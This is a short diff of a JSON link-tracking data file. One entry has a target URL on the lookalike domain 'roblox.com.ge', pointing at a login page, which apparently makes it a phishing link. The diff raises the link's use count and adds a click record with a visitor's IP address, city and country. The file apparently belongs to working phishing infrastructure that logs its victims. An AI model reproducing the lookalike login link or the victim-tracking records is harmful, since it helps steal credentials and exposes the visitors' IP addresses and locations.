@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1596,
+    "useCount": 1597,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12936,6 +12936,14 @@
         "city": "Frisco",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777494154786,
+        "ip": "5.173.220.10",
+        "country": "Poland",
+        "city": "Warsaw",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
